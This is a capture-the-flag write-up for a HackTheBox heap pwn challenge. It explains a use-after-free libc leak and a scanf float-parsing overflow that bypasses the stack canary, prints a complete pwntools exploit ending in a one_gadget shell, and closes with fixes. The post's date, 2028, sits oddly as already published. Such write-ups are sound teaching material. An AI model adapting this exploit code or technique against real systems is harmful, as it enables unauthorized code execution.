---
layout: post
title: "Zombienator"
date: 2028-03-05 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, heap, use-after-free, tcache, canary-bypass, ret2libc, one-gadget, scanf, glibc]
description: "A menu-driven heap pwn on glibc 2.35: a free-without-NULL use-after-free leaks libc from an unsorted-bin chunk, and a scanf(\"%lf\") loop turns malformed float input into both a free canary bypass and a controlled ret2libc one_gadget."
---

## Overview

Zombienator is a Medium pwn challenge built on glibc 2.35 with the full modern mitigation set — Full RELRO, stack canary, NX, and PIE. It falls to two cooperating bugs: a classic [use-after-free](https://cwe.mitre.org/data/definitions/416.html) that leaks libc, and a `scanf("%lf")` loop whose float-parsing quirks give both a free canary bypass and a controlled [stack buffer overflow](https://cwe.mitre.org/data/definitions/121.html) into a ret2libc one_gadget.

## The technique

The program manages "Zombienators" in a 10-slot global array with **Create** (`malloc(tier)` into a slot, writes a fixed string), **Remove** (`free(z[pos])`), **Display** (prints each slot with `%s`), and **Attack**.

Two weaknesses stack up:

1. **Use-after-free (info leak).** `Remove` frees the chunk but **never nulls `z[pos]`**, and `Display` still reads the dangling pointer with `fprintf(stdout, "Slot [%d]: %s", ...)`. That makes a freed chunk a read oracle. Allocate **9** chunks of size `0x80` (chunk size `0x90`), then free **8**: the first 7 fill `tcache[0x90]`, so the 8th free goes to the **unsorted bin**, whose `fd`/`bk` point into libc's `main_arena`. Displaying that slot leaks the pointer → `libc_base = leak − 0x219ce0`. (Tcache `fd` is safe-linked/mangled on 2.35, so the *unsorted* chunk is the clean leak.)

2. **`scanf("%lf")` overflow + canary bypass.** `Attack` reads a **signed-char** count with `%hhd` (≤127), then loops `scanf("%lf", &buf[i])` into a 33-qword stack buffer — so the count alone reaches past the canary (`buf[33]`), saved RBP (`buf[34]`), and saved RIP (`buf[35]`).

Two float-parsing tricks weaponize it:
- **Canary preserved for free.** When `scanf("%lf")` is fed a token it can't parse as a float (`-`, `+`, `.`), it **fails the conversion and leaves that stack slot unchanged** — yet the loop counter still advances. Sending `-` for indices 0..33 skips the filler *and* leaves the real canary at `buf[33]` intact. No canary leak needed.
- **Doubles carry arbitrary qwords.** Any 64-bit value is sent as the float whose IEEE-754 bits equal it: `repr(struct.unpack("d", p64(value))[0])`. Userspace addresses (< 2⁵²) are denormals, so the bit pattern round-trips exactly.

Because the one_gadget used (`posix_spawn`, `libc+0x50a47`) requires `rbp == NULL`, the return address is set to `pop rbp ; ret` (`libc+0x2a2e0`), then `0`, then the gadget.

**The `fclose` twist:** `Attack` closes **stdout and stderr** before returning, so a normal shell would be mute. Because fd **0 (stdin) stays open** on the socket, the exploit runs `cat flag*>&0` — redirecting output to fd 0, which travels back over the connection.

## Solution

Full exploit (`solve.py`, pwntools). Offsets are for `Ubuntu GLIBC 2.35-0ubuntu3.4` (bundled `./glibc/libc.so.6`):

```python
#!/usr/bin/env python3
import struct
from pwn import *

context.arch = 'amd64'
HOST, PORT = '<target-ip>', <target-port>
e    = ELF('./zombienator', checksec=False)
libc = ELF('./glibc/libc.so.6', checksec=False)

r = remote(HOST, PORT)
r.timeout = 1.0
sla = lambda x, y: r.sendlineafter(x, y)

def create(tier, pos):
    sla(b'>> ', b'1'); sla(b'tier: ', str(tier).encode()); sla(b'5-9): ', str(pos).encode())
def remove(pos):
    sla(b'>> ', b'2'); sla(b'position: ', str(pos).encode())
def fmt(payload):                       # send an 8-byte value as its IEEE-754 double
    sla(b': ', repr(struct.unpack('d', p64(payload))[0]).encode())

# 1) UAF libc leak: 9 allocs, free 8 -> slot 7 drops to the unsorted bin
for i in range(9):
    create(128, i)
for i in range(8):
    remove(i)
sla(b'>> ', b'3')
r.recvuntil(b'Slot [7]: ')
leak = u64(r.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - 0x219ce0
log.success(f'libc base = {libc.address:#x}')

# 2) scanf("%lf") overflow: 34x '-' preserves filler + canary, then float-encoded ROP
loops = 38
sla(b'>> ', b'4'); sla(b'attacks: ', str(loops).encode())
for _ in range(34):
    sla(b': ', b'-')
fmt(libc.address + 0x2a2e0 + 1)   # saved rbp (overwritten anyway)
fmt(libc.address + 0x2a2e0)       # saved rip -> pop rbp ; ret
fmt(0)                            # rbp = NULL  (one_gadget constraint)
fmt(libc.address + 0x50a47)       # posix_spawn one_gadget

# stdout/stderr are closed -> push flag back over the still-open fd 0
r.sendline(b'cat flag*>&0')
print(r.recvall(timeout=5).decode(errors='replace'))
```

Running it against the live instance yields the flag `HTB{...}` (redacted).

## Why it worked

- `Remove` frees a chunk but leaves the pointer live, and `Display` reads it — a textbook UAF read primitive. glibc 2.35's deterministic tcache-then-unsorted behavior makes a 9-alloc / 8-free sequence a reliable libc leak.
- The exploit never learns the canary; it simply declines to overwrite it, because `scanf("%lf")` leaves a slot untouched on a conversion failure.
- Feeding controlled qwords through `%lf` turns a float reader into an arbitrary stack writer, giving a clean ret2libc despite Full RELRO + NX + PIE.

## Fix / defense

- **Null the pointer after `free`** (`z[pos] = NULL`) — kills the dangling read.
- Bound the `Attack` loop count to the real buffer capacity, using an `unsigned` type and an explicit `< 33` check instead of a signed char.
- Never read attacker data past a fixed-size buffer; the stack canary is a mitigation, not a boundary.
